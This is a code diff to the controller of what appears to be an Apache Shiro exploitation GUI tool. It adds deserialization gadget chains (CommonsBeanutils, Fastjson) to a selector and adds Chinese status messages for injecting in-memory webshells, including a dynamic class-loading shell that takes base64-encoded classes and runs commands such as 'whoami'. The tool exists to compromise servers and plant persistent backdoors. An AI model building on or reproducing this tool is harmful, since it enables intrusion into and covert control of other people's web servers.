@@ -149,12 +149,15 @@ public class ShiroController {
         chainChoiceBox.getItems().add("CommonsBeanutilsString");
         chainChoiceBox.getItems().add("CommonsBeanutilsString_183");
         chainChoiceBox.getItems().add("CommonsBeanutilsString_192s");
+        chainChoiceBox.getItems().add("CommonsBeanutils192NOCC");
+        chainChoiceBox.getItems().add("Fastjson1");
+        chainChoiceBox.getItems().add("Fastjson2");
 
         echoChoiceBox.getItems().add("AllEcho");
         echoChoiceBox.getItems().add("TomcatEcho");
         echoChoiceBox.getItems().add("SpringEcho");
 
-        chainChoiceBox.setValue("CommonsBeanutilsAttrCompare_183");
+        chainChoiceBox.setValue("CommonsBeanutils1");
         echoChoiceBox.setValue("SpringEcho");
 
         memShellChoiceBox.getItems().addAll(MEM_MAP.keySet().stream().sorted().collect(Collectors.toList()));
@@ -441,6 +444,11 @@ public class ShiroController {
                     memShellInjectInfo.appendText("【+】 " + memShell + " 内存马注入成功： " + tmpUrl + "?name=&user=whoami \n" +
                             "【可选】 type参数：设置响应编码 (utf-8 | gbk)\n" +
                             "【可选】 base参数: 默认不填，存在则需要将 user参数 的值用base64编码\n" +
+                            " POST请求时，修改请求头：Content-Type: application/x-www-form-urlencoded \n\n");
+                } else if (memShell.contains("动态类加载")) {
+                    memShellInjectInfo.appendText("【+】 " + memShell + " 内存马注入成功：" + tmpUrl + "\n" +
+                            "【可选】 enable参数： 默认不填，启用加载标识\n" +
+                            "【可选】 code参数：传入base64编码后的class\n" +
                             " POST请求时，修改请求头：Content-Type: application/x-www-form-urlencoded \n\n");
                 } else {
                     memShellInjectInfo.appendText("【+】 " + memShell + " 内存马注入成功：" + result + "  密码：" + password + "\n\n");
